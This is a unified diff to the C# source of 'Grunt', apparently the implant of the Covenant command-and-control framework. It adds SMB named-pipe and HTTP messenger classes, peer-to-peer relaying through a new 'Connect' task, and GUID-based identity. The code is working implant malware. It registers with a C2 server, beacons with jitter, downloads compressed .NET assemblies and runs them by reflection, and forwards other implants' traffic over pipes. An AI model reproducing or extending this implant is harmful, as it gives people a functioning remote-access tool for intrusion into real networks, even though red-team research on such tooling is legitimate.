@@ -1,8 +1,10 @@
 ﻿using System;
+using System.Net;
+using System.Linq;
 using System.Text;
 using System.IO;
+using System.IO.Pipes;
 using System.IO.Compression;
-using System.Net;
 using System.Threading;
 using System.Reflection;
 using System.Collections.Generic;
@@ -14,14 +16,12 @@ namespace Grunt
 {
     class Grunt
     {
-        public static void Execute(Aes SessionKey)
+        public static void Execute(string GUID, Aes SessionKey, NamedPipeServerStream pipe = null)
         {
             try
             {
                 string CovenantURI = @"{{REPLACE_COVENANT_URI}}";
                 string CovenantCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
-                int Id = Convert.ToInt32(@"{{REPLACE_GRUNT_ID}}");
-                string Name = @"{{REPLACE_GRUNT_NAME}}";
                 int Delay = Convert.ToInt32(@"{{REPLACE_DELAY}}");
                 int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER}}");
                 int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
@@ -63,20 +63,35 @@ namespace Grunt
                 string UserDomainName = Environment.UserDomainName;
                 string UserName = Environment.UserName;
 
-                string RegisterBody = @"{ ""id"": " + Convert.ToString(Id) + @", ""name"": """ + Name + @""", ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
-                GruntMessenger messenger = new GruntMessenger
+                string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
+                IMessenger baseMessenger = null;
+                if (pipe != null)
+                {
+                    baseMessenger = new SMBMessenger(pipe);
+                }
+                else
+                {
+                    baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls, ProfileHttpCookies);
+                    baseMessenger.Read();
+                }
+                baseMessenger.Identifier = GUID;
+                TaskingMessenger messenger = new TaskingMessenger
                 (
-                    Id, Name, CovenantURI,
-                    CovenantCertHash, SessionKey,
-                    RegisterBody,
-                    ProfileHttpHeaderNames, ProfileHttpHeaderValues,
-                    ProfileHttpUrls, ProfileHttpCookies,
-                    ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse
+                    new MessageCrafter(GUID, SessionKey),
+                    baseMessenger,
+                    new Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse)
                 );
+                messenger.WriteTaskingMessage(RegisterBody);
+                messenger.SetAuthenticator(messenger.ReadTaskingMessage().message);
+                try
+                {
+                    messenger.WriteTaskingMessage("");
+                }
+                catch (Exception) {}
                 TaskHandler taskSender = new TaskHandler();
                 EventHandler<TaskCompletedArgs> taskHandler = (sender, eventArgs) =>
                 {
-                    messenger.PostMessage(eventArgs.output, eventArgs.message.name);
+                    messenger.WriteTaskingMessage(eventArgs.output, eventArgs.message.name);
                 };
                 taskSender.TaskCompleted += taskHandler;
                 Random rnd = new Random();
@@ -87,23 +102,34 @@ namespace Grunt
                     Thread.Sleep((Delay + rnd.Next(Jitter)) * 1000);
                     try
                     {
-                        GruntTaskingMessage message = messenger.GetMessage("");
+                        GruntTaskingMessage message = messenger.ReadTaskingMessage();
                         if (message != null)
                         {
                             ConnectAttemptCount = 0;
                             if (message.type == GruntTaskingType.Assembly)
                             {
-								string[] pieces = message.message.Split(',');
-								if (pieces.Length > 0)
-								{
-									object[] parameters = null;
-									if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
-									for (int i = 1; i < pieces.Length; i++) { parameters [i-1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
+                                string[] pieces = message.message.Split(',');
+                                if (pieces.Length > 0)
+                                {
+                                    object[] parameters = null;
+                                    if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
+                                    for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
                                     byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
                                     byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
                                     Assembly gruntTask = Assembly.Load(decompressedBytes);
-                                    new Thread(() => taskSender.ExecuteTask(gruntTask, parameters, message)).Start();
-								}
+                                    // new Thread(() => taskSender.ExecuteTask(gruntTask, parameters, message)).Start();
+                                    string output = "";
+                                    try
+                                    {
+                                        var results = gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
+                                        if (results != null) { output = (string)results; }
+                                        messenger.WriteTaskingMessage(output, message.name);
+                                    }
+                                    catch (Exception e)
+                                    {
+                                        messenger.WriteTaskingMessage("TaskHandler Exception: " + e.Message + "\n" + e.StackTrace, message.name);
+                                    }
+                                }
                             }
                             else if (message.type == GruntTaskingType.Set)
                             {
@@ -124,19 +150,27 @@ namespace Grunt
                             }
                             else if (message.type == GruntTaskingType.Kill)
                             {
-                                messenger.PostMessage("Killed", message.name);
+                                messenger.WriteTaskingMessage("Killed", message.name);
                                 return;
+                            }
+                            else if (message.type == GruntTaskingType.Connect)
+                            {
+                                string[] split = message.message.Split(',');
+                                messenger.Connect(split[0], split[1]);
                             }
                         }
                     }
-                    catch (Exception)
+                    catch (Exception e)
                     {
+                        Console.Error.WriteLine("Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                         ConnectAttemptCount++;
                         if (ConnectAttemptCount >= ConnectAttempts) { return; }
                     }
                 }
             }
-            catch (Exception e) { Console.Error.WriteLine(e.Message); Console.Error.WriteLine(e.StackTrace); }
+            catch (Exception e) {
+                Console.Error.WriteLine(e.Message); Console.Error.WriteLine(e.StackTrace);
+            }
         }
     }
 
@@ -171,35 +205,277 @@ namespace Grunt
         }
     }
 
-    public class GruntMessenger
+    public interface IMessenger
     {
-        private int GruntId { get; }
-        private string GruntName { get; }
-        private string CovenantURI { get; }
-        private Aes SessionKey { get; }
-		private string CookieAuthKey { get; } = "";
+        string Identifier { get; set; }
+        string Authenticator { get; set; }
+        string Read();
+        void Write(string Message);
+        void Close();
+    }
 
-		private List<string> ProfileHttpHeaderNames { get; }
+    public class Profile
+    {
+        private string GetResponse { get; }
+        private string PostRequest { get; }
+        private string PostResponse { get; }
+
+        public Profile(string GetResponse, string PostRequest, string PostResponse)
+        {
+            this.GetResponse = GetResponse;
+            this.PostRequest = PostRequest;
+            this.PostResponse = PostResponse;
+        }
+
+        public GruntEncryptedMessage ParseGetResponse(string Message) { return Parse(this.GetResponse, Message); }
+        public GruntEncryptedMessage ParsePostRequest(string Message) { return Parse(this.PostRequest, Message); }
+        public GruntEncryptedMessage ParsePostResponse(string Message) { return Parse(this.PostResponse, Message); }
+        public string FormatGetResponse(GruntEncryptedMessage Message) { return Format(this.GetResponse, Message); }
+        public string FormatPostRequest(GruntEncryptedMessage Message) { return Format(this.PostRequest, Message); }
+        public string FormatPostResponse(GruntEncryptedMessage Message) { return Format(this.PostResponse, Message); }
+
+        private static GruntEncryptedMessage Parse(string Format, string Message)
+        {
+            string json = Common.GruntEncoding.GetString(Utilities.HttpMessageTransform.Invert(
+                Utilities.Parse(Message, Format)[0]
+            ));
+            if (json == null || json.Length < 3)
+            {
+                return null;
+            }
+            return GruntEncryptedMessage.FromJson(json);
+        }
+
+        private static string Format(string Format, GruntEncryptedMessage Message)
+        {
+            return String.Format(Format,
+                Utilities.HttpMessageTransform.Transform(Common.GruntEncoding.GetBytes(GruntEncryptedMessage.ToJson(Message)))
+            );
+        }
+    }
+
+    public class TaskingMessenger
+    {
+        private object _UpstreamLock = new object();
+        private IMessenger _UpstreamMessenger;
+        private IMessenger UpstreamMessenger
+        {
+            get { return this._UpstreamMessenger; }
+            set { this._UpstreamMessenger = value; }
+        }
+        private MessageCrafter Crafter { get; }
+        private Profile Profile { get; }
+
+        protected List<IMessenger> DownstreamMessengers { get; } = new List<IMessenger>();
+
+        public TaskingMessenger(MessageCrafter Crafter, IMessenger Messenger, Profile Profile)
+        {
+            this.Crafter = Crafter;
+            this.UpstreamMessenger = Messenger;
+            this.Profile = Profile;
+        }
+
+        public GruntTaskingMessage ReadTaskingMessage()
+        {
+            // TODO: why does this need to be PostResponse?
+            string read = "";
+            lock (_UpstreamLock)
+            {
+                read = this.UpstreamMessenger.Read();
+            }
+            GruntEncryptedMessage gruntMessage = this.Profile.ParsePostResponse(read);
+            if (gruntMessage.Type == GruntEncryptedMessage.GruntEncryptedMessageType.Tasking)
+            {
+                string message = this.Crafter.Retrieve(gruntMessage);
+                if (gruntMessage == null || message == null || message == "")
+                {
+                    return null;
+                }
+                return GruntTaskingMessage.FromJson(message);
+            }
+            else
+            {
+                string json = this.Crafter.Retrieve(gruntMessage);
+                GruntEncryptedMessage wrappedMessage = GruntEncryptedMessage.FromJson(json);
+                IMessenger relay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrappedMessage.GUID);
+                if (relay != null)
+                {
+                    // TODO: why does this need to be PostResponse?
+                    relay.Write(this.Profile.FormatPostResponse(wrappedMessage));
+                }
+                return null;
+            }
+        }
+
+        public void WriteTaskingMessage(string Message, string Meta = "")
+        {
+            GruntEncryptedMessage gruntMessage = this.Crafter.Create(Message, Meta);
+            string uploaded = this.Profile.FormatPostRequest(gruntMessage);
+            lock (this._UpstreamLock)
+            {
+                this.UpstreamMessenger.Write(uploaded);
+            }
+        }
+
+        public void SetAuthenticator(string Authenticator)
+        {
+            lock (this._UpstreamLock)
+            {
+                this.UpstreamMessenger.Authenticator = Authenticator;
+            }
+        }
+
+        public void Connect(string Hostname, string PipeName)
+        {
+            IMessenger downstream = new SMBMessenger(Hostname, PipeName);
+
+            string stage0 = downstream.Read();
+            GruntEncryptedMessage message = this.Profile.ParsePostRequest(stage0);
+            downstream.Identifier = message.GUID.Substring(10);
+            new Thread(() => {
+                while (true)
+                {
+                    try
+                    {
+                        string read = downstream.Read();
+                        lock (this._UpstreamLock)
+                        {
+                            this.UpstreamMessenger.Write(read);
+                        }
+                    }
+                    catch(Exception e)
+                    {
+                        Console.Error.WriteLine("Thread Exception: " + e.Message + Environment.NewLine + e.StackTrace);
+                    }
+                }
+            }).Start();
+
+            this.DownstreamMessengers.Add(downstream);
+            lock (this._UpstreamLock)
+            {
+                this.UpstreamMessenger.Write(stage0);
+            }
+        }
+    }
+
+    public class SMBMessenger : IMessenger
+    {
+        public string Identifier { get; set; } = "";
+        public string Authenticator { get; set; } = "";
+
+        private object _WritePipeLock = new object();
+        private PipeStream Pipe { get; }
+        private string PipeName { get; }
+
+        public SMBMessenger(NamedPipeServerStream ServerPipe)
+        {
+            this.Pipe = ServerPipe;
+        }
+
+        public SMBMessenger(string Hostname, string PipeName = "gruntsvc", int Timeout = 5000)
+        {
+            this.PipeName = PipeName;
+            lock (this._WritePipeLock)
+            {
+                NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, this.PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
+                ClientPipe.Connect(Timeout);
+                ClientPipe.ReadMode = PipeTransmissionMode.Byte;
+                this.Pipe = ClientPipe;
+            }
+        }
+
+        public string Read()
+        {
+            return Common.GruntEncoding.GetString(this.ReadBytes());
+        }
+
+        public void Write(string Message)
+        {
+            this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
+        }
+
+        public void Close()
+        {
+            this.Pipe.Close();
+        }
+
+        private void WriteBytes(byte[] bytes)
+        {
+            lock (this._WritePipeLock)
+            {
+                byte[] compressed = Utilities.Compress(bytes);
+                byte[] size = new byte[4];
+                size[0] = (byte)(compressed.Length >> 24);
+                size[1] = (byte)(compressed.Length >> 16);
+                size[2] = (byte)(compressed.Length >> 8);
+                size[3] = (byte)compressed.Length;
+                this.Pipe.Write(size, 0, size.Length);
+                var writtenBytes = 0;
+                while (writtenBytes < compressed.Length)
+                {
+                    int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);
+                    this.Pipe.Write(compressed, writtenBytes, bytesToWrite);
+                    writtenBytes += bytesToWrite;
+                }
+            }
+        }
+
+        private byte[] ReadBytes()
+        {
+            byte[] size = new byte[4];
+            int totalReadBytes = 0;
+            do
+            {
+                totalReadBytes += this.Pipe.Read(size, 0, size.Length);
+            } while (totalReadBytes < size.Length);
+            int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];
+            
+            byte[] buffer = new byte[1024];
+            using (var ms = new MemoryStream())
+            {
+                totalReadBytes = 0;
+                int readBytes = 0;
+                do
+                {
+                    readBytes = this.Pipe.Read(buffer, 0, buffer.Length);
+                    ms.Write(buffer, 0, readBytes);
+                    totalReadBytes += readBytes;
+                } while (totalReadBytes < len);
+                return Utilities.Decompress(ms.ToArray());
+            }
+        }
+    }
+
+    public class HttpMessenger : IMessenger
+    {
+        public string Identifier { get; set; } = "";
+        public string Authenticator { get; set; } = "";
+
+        private string CookieAuthKeyName { get; }
+        private string CovenantURI { get; }
+        private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();
+        private object _WebClientLock = new object();
+
+        private Random Random { get; set; } = new Random();
+        private List<string> ProfileHttpHeaderNames { get; }
         private List<string> ProfileHttpHeaderValues { get; }
         private List<string> ProfileHttpUrls { get; }
         private List<string> ProfileHttpCookies { get; }
-		private string ProfileHttpGetResponse { get; } = "";
-		private string ProfileHttpPostRequest { get; } = "";
-		private string ProfileHttpPostResponse { get; } = "";
 
-        private Random Random { get; } = new Random();
+        private string ToReadValue { get; set; } = "";
 
-        private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();
-
-        public GruntMessenger(int Id, string Name, string CovenantURI, string CovenantCertHash, Aes SessionKey, string RegisterBody, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls, List<string> ProfileHttpCookies, string ProfileHttpGetResponse, string ProfileHttpPostRequest, string ProfileHttpPostResponse)
+        public HttpMessenger(string CovenantURI, string CovenantCertHash, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls, List<string> ProfileHttpCookies)
         {
-            this.GruntId = Id;
-            this.GruntName = Name;
             this.CovenantURI = CovenantURI;
-            this.SessionKey = SessionKey;
-            CovenantClient.UseDefaultCredentials = true;
-            CovenantClient.Proxy = WebRequest.DefaultWebProxy;
-            CovenantClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
+            this.ProfileHttpHeaderNames = ProfileHttpHeaderNames;
+            this.ProfileHttpHeaderValues = ProfileHttpHeaderValues;
+            this.ProfileHttpUrls = ProfileHttpUrls;
+            this.ProfileHttpCookies = ProfileHttpCookies;
+            this.CookieAuthKeyName = this.ProfileHttpCookies[this.Random.Next(this.ProfileHttpCookies.Count)];
+
+            this.CovenantClient.UseDefaultCredentials = true;
+            this.CovenantClient.Proxy = WebRequest.DefaultWebProxy;
+            this.CovenantClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
             if (CovenantCertHash != "")
             {
                 ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
@@ -208,58 +484,68 @@ namespace Grunt
                     return cert.GetCertHashString() == CovenantCertHash;
                 };
             }
-            this.ProfileHttpHeaderNames = ProfileHttpHeaderNames;
-            this.ProfileHttpHeaderValues = ProfileHttpHeaderValues;
-            this.ProfileHttpUrls = ProfileHttpUrls;
-            this.ProfileHttpCookies = ProfileHttpCookies;
-            this.ProfileHttpGetResponse = ProfileHttpGetResponse;
-            this.ProfileHttpPostRequest = ProfileHttpPostRequest;
-            this.ProfileHttpPostResponse = ProfileHttpPostResponse;
-
-            this.CovenantClient.DownloadString(this.CovenantURI + this.ProfileHttpUrls[Random.Next(this.ProfileHttpUrls.Count)]);
-            this.CookieAuthKey = this.PostMessage(RegisterBody, "", GruntEncryptedMessageType.Register).Replace("\"", "");
-            this.CovenantClient.Add(new Cookie(this.ProfileHttpCookies[Random.Next(this.ProfileHttpCookies.Count)], this.CookieAuthKey, "/", this.CovenantURI.Split(':')[1].Split('/')[2]));
         }
 
-        public string PostMessage(string message, string meta, GruntEncryptedMessageType messageType = GruntEncryptedMessageType.PostTask)
+        public string Read()
         {
-            string path = this.ProfileHttpUrls[Random.Next(this.ProfileHttpUrls.Count)];
-            GruntEncryptedMessage postMessage = this.Create(Common.GruntEncoding.GetBytes(message), meta, messageType);
-			this.CovenantClient.Headers.Clear();
-			for(int i = 0; i < ProfileHttpHeaderValues.Count; i++) { this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]); }
-            string messageString = GruntEncryptedMessage.ToJson(postMessage);
-			string transformedMessage = Utilities.HttpMessageTransform.Transform(Common.GruntEncoding.GetBytes(messageString));
-			string data = String.Format(this.ProfileHttpPostRequest, transformedMessage);
-            string response = CovenantClient.UploadString(this.CovenantURI + path, data);
-            if (response.Length < 3) { return ""; }
-            
-            string extracted = Utilities.Parse(response, this.ProfileHttpPostResponse)[0];
-			string invertedMessage = Common.GruntEncoding.GetString(Utilities.HttpMessageTransform.Invert(extracted));
-            GruntEncryptedMessage responseMessage = GruntEncryptedMessage.FromJson(invertedMessage);
-            if (!responseMessage.VerifyHMAC(SessionKey.Key)) { throw new GruntHMACVerifyException(); }
-            return Common.GruntEncoding.GetString(Utilities.AesDecrypt(responseMessage, SessionKey.Key));
+            if (ToReadValue != "")
+            {
+                string temp = ToReadValue;
+                ToReadValue = "";
+                return temp;
+            }
+            lock (this._WebClientLock)
+            {
+                this.SetupCookieWebClient();
+                return this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL());
+            }
         }
 
-        public GruntTaskingMessage GetMessage(string meta)
+        public void Write(string Message)
         {
-            string path = this.ProfileHttpUrls[Random.Next(this.ProfileHttpUrls.Count)];
-            this.CovenantClient.Headers.Clear();
-            for(int i = 0; i < ProfileHttpHeaderValues.Count; i++) { this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]); }
-            string response = CovenantClient.DownloadString(this.CovenantURI + path);
-            string extracted = Utilities.Parse(response, this.ProfileHttpPostResponse)[0];
-
-            if (extracted.Length < 3) { return null; }
-            string invertedMessage = Common.GruntEncoding.GetString(Utilities.HttpMessageTransform.Invert(extracted));
-            GruntEncryptedMessage responseMessage = GruntEncryptedMessage.FromJson(invertedMessage);
-            if (!responseMessage.VerifyHMAC(this.SessionKey.Key)) { throw new GruntHMACVerifyException(); }
-            String decryptedString = Common.GruntEncoding.GetString(Utilities.AesDecrypt(responseMessage, this.SessionKey.Key));
-            GruntTaskingMessage taskingMessage = GruntTaskingMessage.FromJson(decryptedString);
-			return taskingMessage;
+            lock (this._WebClientLock)
+            {
+                this.SetupCookieWebClient();
+                this.ToReadValue = this.CovenantClient.UploadString(this.CovenantURI + this.GetURL(), Message);
+            }
         }
 
-        public GruntEncryptedMessage Create(byte[] message, string meta, GruntEncryptedMessageType type = GruntEncryptedMessageType.PostTask)
+        public void Close() { }
+
+        private string GetURL()
         {
-            byte[] encryptedMessagePacket = Utilities.AesEncrypt(message, SessionKey.Key);
+            return this.ProfileHttpUrls[this.Random.Next(this.ProfileHttpUrls.Count)];
+        }
+
+        private void SetupCookieWebClient()
+        {
+            for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
+            {
+                this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]);
+            }
+            this.CovenantClient.Add(new Cookie(this.CookieAuthKeyName, this.Authenticator, "/", this.CovenantURI.Split(':')[1].Split('/')[2]));
+        }
+    }
+
+    public class MessageCrafter
+    {
+        private string GUID { get; }
+        private Aes SessionKey { get; }
+
+        public MessageCrafter(string GUID, Aes SessionKey)
+        {
+            this.GUID = GUID;
+            this.SessionKey = SessionKey;
+        }
+
+        public GruntEncryptedMessage Create(string Message, string Meta = "")
+        {
+            return this.Create(Common.GruntEncoding.GetBytes(Message), Meta);
+        }
+
+        public GruntEncryptedMessage Create(byte[] Message, string Meta = "")
+        {
+            byte[] encryptedMessagePacket = Utilities.AesEncrypt(Message, this.SessionKey.Key);
             byte[] encryptionIV = new byte[Common.AesIVLength];
             Buffer.BlockCopy(encryptedMessagePacket, 0, encryptionIV, 0, Common.AesIVLength);
             byte[] encryptedMessage = new byte[encryptedMessagePacket.Length - Common.AesIVLength];
@@ -268,34 +554,41 @@ namespace Grunt
             byte[] hmac = Utilities.ComputeHMAC(encryptedMessage, SessionKey.Key);
             return new GruntEncryptedMessage
             {
-                Id = GruntId,
-                Name = GruntName,
-                Type = type,
-                Meta = meta,
+                GUID = this.GUID,
+                Meta = Meta,
                 EncryptedMessage = Convert.ToBase64String(encryptedMessage),
                 IV = Convert.ToBase64String(encryptionIV),
                 HMAC = Convert.ToBase64String(hmac)
             };
         }
 
-        public class CookieWebClient : WebClient
+        public string Retrieve(GruntEncryptedMessage message)
         {
-            public CookieContainer CookieContainer { get; private set; }
-            public CookieWebClient()
+            if (message == null || !message.VerifyHMAC(this.SessionKey.Key))
             {
-                this.CookieContainer = new CookieContainer();
+                return null;
             }
-            public void Add(Cookie cookie)
-            {
-                this.CookieContainer.Add(cookie);
-            }
-            protected override WebRequest GetWebRequest(Uri address)
-            {
-                var request = base.GetWebRequest(address) as HttpWebRequest;
-                if (request == null) return base.GetWebRequest(address);
-                request.CookieContainer = CookieContainer;
-                return request;
-            }
+            return Common.GruntEncoding.GetString(Utilities.AesDecrypt(message, SessionKey.Key));
+        }
+    }
+
+    public class CookieWebClient : WebClient
+    {
+        public CookieContainer CookieContainer { get; private set; }
+        public CookieWebClient()
+        {
+            this.CookieContainer = new CookieContainer();
+        }
+        public void Add(Cookie cookie)
+        {
+            this.CookieContainer.Add(cookie);
+        }
+        protected override WebRequest GetWebRequest(Uri address)
+        {
+            var request = base.GetWebRequest(address) as HttpWebRequest;
+            if (request == null) return base.GetWebRequest(address);
+            request.CookieContainer = CookieContainer;
+            return request;
         }
     }
 
@@ -303,7 +596,8 @@ namespace Grunt
     {
         Assembly,
         Set,
-        Kill
+        Kill,
+        Connect
     }
 
     public enum GruntSetTaskingType
@@ -343,22 +637,17 @@ namespace Grunt
         }
     }
 
-    public enum GruntEncryptedMessageType
-    {
-        Stage0,
-        Stage1,
-        Stage2,
-        Register,
-        GetTask,
-        PostTask
-    }
-
     public class GruntEncryptedMessage
     {
-		public int Id { get; set; } = 0;
-		public string Name { get; set; } = "";
-        public GruntEncryptedMessageType Type { get; set; } = GruntEncryptedMessageType.GetTask;
-		public string Meta { get; set; } = "";
+        public enum GruntEncryptedMessageType
+        {
+            Routing,
+            Tasking
+        }
+
+		public string GUID { get; set; } = "";
+        public GruntEncryptedMessageType Type { get; set; }
+        public string Meta { get; set; } = "";
 		public string IV { get; set; } = "";
 		public string EncryptedMessage { get; set; } = "";
 		public string HMAC { get; set; } = "";
@@ -377,20 +666,19 @@ namespace Grunt
             }
         }
 
-		private static string GruntEncryptedMessageFormat = @"{{""Id"":{0},""Name"":""{1}"",""Type"":{2},""Meta"":""{3}"",""IV"":""{4}"",""EncryptedMessage"":""{5}"",""HMAC"":""{6}""}}";
+        private static string GruntEncryptedMessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
         public static GruntEncryptedMessage FromJson(string message)
         {
 			List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat.Replace("{{", "{").Replace("}}", "}"));
-            if (parseList.Count < 7)  { return null; }
+            if (parseList.Count < 5)  { return null; }
             return new GruntEncryptedMessage
             {
-                Id = int.Parse(parseList[0]),
-                Name = parseList[1],
-                Type = (GruntEncryptedMessageType) int.Parse(parseList[2]),
-                Meta = parseList[3],
-                IV = parseList[4],
-                EncryptedMessage = parseList[5],
-                HMAC = parseList[6]
+                GUID = parseList[0],
+                Type = (GruntEncryptedMessageType)int.Parse(parseList[1]),
+                Meta = parseList[2],
+                IV = parseList[3],
+                EncryptedMessage = parseList[4],
+                HMAC = parseList[5]
             };
         }
 
@@ -398,8 +686,7 @@ namespace Grunt
         {
             return String.Format(
                 GruntEncryptedMessageFormat,
-                message.Id.ToString(),
-                Utilities.JavaScriptStringEncode(message.Name),
+                Utilities.JavaScriptStringEncode(message.GUID),
                 message.Type.ToString("D"),
                 Utilities.JavaScriptStringEncode(message.Meta),
                 Utilities.JavaScriptStringEncode(message.IV),
@@ -416,9 +703,6 @@ namespace Grunt
         public static PaddingMode AesPaddingMode = PaddingMode.PKCS7;
         public static Encoding GruntEncoding = Encoding.UTF8;
     }
-
-    public class GruntHMACVerifyException : Exception
-    { }
 
     public static class Utilities
     {
@@ -479,6 +763,20 @@ namespace Grunt
             return Convert.ToBase64String(calculatedHash) == Convert.ToBase64String(hash);
         }
 
+        public static byte[] Compress(byte[] bytes)
+        {
+            byte[] compressedBytes;
+            using (MemoryStream memoryStream = new MemoryStream())
+            {
+                using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress))
+                {
+                    deflateStream.Write(bytes, 0, bytes.Length);
+                }
+                compressedBytes = memoryStream.ToArray();
+            }
+            return compressedBytes;
+        }
+
         public static byte[] Decompress(byte[] compressed)
         {
             using (MemoryStream inputStream = new MemoryStream(compressed.Length))
@@ -510,7 +808,6 @@ namespace Grunt
             if(format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
             if(format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
             if(format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
-            if(format.Contains("{6}")) { format = format.Replace("{6}", "(?'group6'.*)"); }
             Match match = new Regex(format).Match(data);
             List<string> matches = new List<string>();
 			if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
@@ -519,7 +816,6 @@ namespace Grunt
             if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
             if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
             if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
-            if (match.Groups["group6"] != null) { matches.Add(match.Groups["group6"].Value); }
             return matches;
         }
 
